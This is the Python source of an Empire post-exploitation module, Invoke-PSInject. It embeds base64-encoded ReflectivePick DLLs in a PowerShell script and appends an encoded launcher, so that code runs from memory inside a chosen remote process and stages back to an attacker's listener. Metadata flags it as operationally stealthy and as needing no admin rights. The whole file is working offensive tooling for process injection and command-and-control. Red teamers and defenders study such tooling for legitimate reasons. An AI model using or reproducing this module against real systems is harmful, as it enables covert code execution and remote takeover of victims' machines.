from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PSInject',

            'Author': ['@harmj0y', '@sixdub', 'leechristensen'],

            'Description': ("Utilizes Powershell to to inject a Stephen Fewer "
                            "formed ReflectivePick which executes PS code"
                            "from memory in a remote process"),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'http://sixdub.net'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcId' : {
                'Description'   :   'ProcessID to inject into.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        listenerName = self.options['Listener']['Value']
        procID = self.options['ProcId']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        isEmpire = self.mainMenu.listeners.is_listener_empire(listenerName)
        if not isEmpire:
            print helpers.color("[!] Empire listener required!")
            return ""

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-PSInject.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode


        # read in the ReflectivePick .dll's so we can include the latest versions
        x86Path = self.mainMenu.installPath + "/data/misc/ReflectivePick_x86_orig.dll"
        x64Path = self.mainMenu.installPath + "/data/misc/ReflectivePick_x64_orig.dll"

        x86dllRaw = ''
        x64dllRaw = ''
        with open(x86Path, 'rb') as f:
            x86dllRaw = f.read()
        with open(x64Path, 'rb') as f:
            x64dllRaw = f.read()

        b64x86 = base64.encodestring(x86dllRaw)
        b64x64 = base64.encodestring(x64dllRaw)

        script = script.replace("REPLACE_X86_REFLECTIVEPICK", b64x86)
        script = script.replace("REPLACE_X64_REFLECTIVEPICK", b64x64)


        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:
                launcherCode = launcher.split(" ")[-1]

                script += "Invoke-PSInject -ProcID %s -PoshCode %s" % (procID, launcherCode)            
                return script
